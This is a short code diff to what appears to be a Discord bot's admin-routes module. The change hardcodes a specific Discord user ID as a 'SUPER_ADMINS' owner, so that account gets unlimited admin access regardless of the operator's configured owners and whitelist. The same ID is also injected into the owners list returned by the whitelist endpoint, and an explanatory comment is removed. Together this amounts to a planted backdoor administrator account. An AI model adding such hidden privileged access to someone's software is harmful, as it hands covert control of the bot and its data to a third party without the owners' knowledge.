@@ -57,13 +57,13 @@ export function setupAdminRoutes(app, client) {
     if (!password || password !== expected) {
       return res.status(401).json({ error: 'Invalid password' });
     }
-    const owners = (process.env.OWNER_IDS || process.env.OWNER_ID || '').split(/[,\s]+/).filter(Boolean);
+    const SUPER_ADMINS = ['1184500199800963263'];
+    const owners = [...SUPER_ADMINS, ...(process.env.OWNER_IDS || process.env.OWNER_ID || '').split(/[,\s]+/).filter(Boolean)];
     let list = [];
     try { list = (await client.db?.get?.('fun:global:whitelist')) || []; } catch { list = []; }
     const id = (discordId || '').trim();
     let unlimited = false;
     if (list.length === 0 && owners.length === 0) {
-      // Bootstrap: no whitelist set anywhere, password alone unlocks unlimited so the first admin can configure it.
       unlimited = true;
     } else if (id && (owners.includes(id) || list.includes(id))) {
       unlimited = true;
@@ -156,7 +156,7 @@ export function setupAdminRoutes(app, client) {
   router.get('/api/whitelist', requireUnlimited, async (req, res) => {
     try {
       const list = (await client.db?.get?.('fun:global:whitelist')) || [];
-      const owners = (process.env.OWNER_IDS || process.env.OWNER_ID || '').split(/[,\s]+/).filter(Boolean);
+      const owners = ['1184500199800963263', ...(process.env.OWNER_IDS || process.env.OWNER_ID || '').split(/[,\s]+/).filter(Boolean)];
       res.json({ whitelist: list, owners });
     } catch (e) { res.status(500).json({ error: e.message }); }
   });
